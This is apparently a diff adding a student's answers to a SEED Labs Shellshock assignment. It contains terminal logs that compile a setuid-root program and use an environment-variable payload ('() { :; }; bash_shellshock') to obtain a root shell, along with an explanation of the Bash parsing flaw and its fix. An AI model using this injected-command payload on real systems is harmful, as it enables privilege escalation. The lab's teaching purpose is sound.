@@ -97,14 +97,63 @@ system("/bin/ls -l");
 ```
 It should be noted that using setuid(geteuid()) to turn the real uid into the effective uid is not a 
 common practice in Set-UID programs, but it does happen.
+
+We can  use  the  Shellshock  vulnerability  to  gain  the  root  privilege. On seedlab setup, the vulnerable bash is bash_shellshock. Therefore we used it instead of bash.
+
+```sh
+[10/20/21]seed@VM:.../cgi-bin$ sudo su 
+root@VM:/usr/lib/cgi-bin# vim shock.c
+root@VM:/usr/lib/cgi-bin# gcc -o shock shock.c
+shock.c: In function ‘main’:
+shock.c:4:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+     setuid(geteuid()); // make real uid = effective uid.
+     ^
+shock.c:4:12: warning: implicit declaration of function ‘geteuid’ [-Wimplicit-function-declaration]
+     setuid(geteuid()); // make real uid = effective uid.
+            ^
+shock.c:5:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+     system("/bin/ls -l");
+     ^
+root@VM:/usr/lib/cgi-bin# chmod u+s shock
+root@VM:/usr/lib/cgi-bin# ls -al shock
+-rwsr-xr-x 1 root root 7424 Oct 20 00:52 shock
+root@VM:/usr/lib/cgi-bin# exit
+exit
+[10/20/21]seed@VM:.../cgi-bin$ export foo='() { :; }; bash_shellshock'
+[10/20/21]seed@VM:.../cgi-bin$ ./shock 
+root@VM:/usr/lib/cgi-bin# 
+```
+
+
 ### Task  2B:  
 Now,  remove  the  setuid(geteuid())  statement  from  the  above  program,  and  repeat your  attack.  Can  you  gain  the  root  privilege?  Please  show  us  your  experiment  results.  Please explain your lab results. (Hint: this problem can be considered similarly how the LD PRELOAD environment variable vulnerability happens in Lab 1).
+
+```sh
+root@VM:/usr/lib/cgi-bin# vim shock.c
+root@VM:/usr/lib/cgi-bin# gcc -o shock2 shock.c
+shock.c: In function ‘main’:
+shock.c:4:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+     system("/bin/ls -l");
+     ^
+root@VM:/usr/lib/cgi-bin# exit     
+exit
+[10/20/21]seed@VM:.../cgi-bin$ ./shock2                               
+[10/20/21]seed@VM:.../cgi-bin$ 
+```
+In our experiment, when that line is removed, the attack fails (with that line, the attack is successful). In other words, if the real user id and the effective user id are the same, the function defined in the environment variable is evaluated, and thus the Shellshock vulnerability will be exploited. However, if the real user id and the effective user id are not the same, the function defined in the environment variable is not evaluated at all.
+
 ### 2.4 Task 3: Where is the Vulnerability Comes From?
 Task 3: The vulnerability is from the Bash source code: line-351 in variables.c. Please research 
 (google it) and figure out why the parse and execute() will cause a security vulnerability.
+
+When a new Bash process finds a function defined this way in its environment, it evalutes the code in the variable using parse_and_execute(). For normal, non-malicious code, executing it simply defines the function in Bash and moves on. However, because it's passed to a generic execution function, Bash will correctly parse and execute additional code defined in that variable after the function definition.You can see that in the new code, a flag called SEVAL_ONECMD has been added that tells Bash to only evaluate the first command (that is, the function definition) and SEVAL_FUNCDEF to only allow functio0n definitions.
+
+
 ### 2.5 Task 4: Questions
 This is a writing task, please answer the following questions in your report:
 ### Task 4: 
 According to secure software principles and rules, what is the fundamental problem of 
 the Shellshock vulnerability? What can we learn from this vulnerability?
 
+The fundamental problem of the Shellshock attack is that as the complexity of software grows, the likelihood that something will be overlooked increases as well. In the case of the bash program, this oversight led to the potentially catastrophic vulnerability exemplified in this lab; a simple coding mistake that wouldn't show up under
+normal use led to a disproportionate amount of potential damage. From this mistake we can learn that software should be subjected to thorough testing and review before implementation, and that security best practices should also be followed to attempt to minimize damage in the event of such an exploit being discovered.
